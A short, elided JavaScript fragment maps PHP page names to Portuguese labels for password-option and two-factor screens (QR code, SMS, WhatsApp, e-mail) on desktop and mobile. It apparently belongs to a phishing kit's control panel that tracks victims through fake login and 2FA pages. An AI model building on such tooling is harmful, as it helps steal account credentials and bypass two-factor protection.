    ...
    <script>
        (function() {
            ...
            const statusMap = {
                ...
                'senha.php': 'Tela de opções de login (QRCODE/SMS/WHATSAPP/E-MAIL) (Desktop)',
                'senha-mobile.php': 'Tela de opções de login (QRCODE/SMS/WHATSAPP/E-MAIL) (Mobile)',
                'dois_fatores.php': 'Tela 2FA - Mensagem (Desktop)',
                'dois_fatores2.php': 'Tela 2FA - Opções de dois fatores (QRCODE/SMS/WHATSAPP/E-MAIL) (Desktop)',
                'doisfatores2mobile.php': 'Tela 2FA - Opções de dois fatores (QRCODE/SMS/WHATSAPP/E-MAIL) (Mobile)',
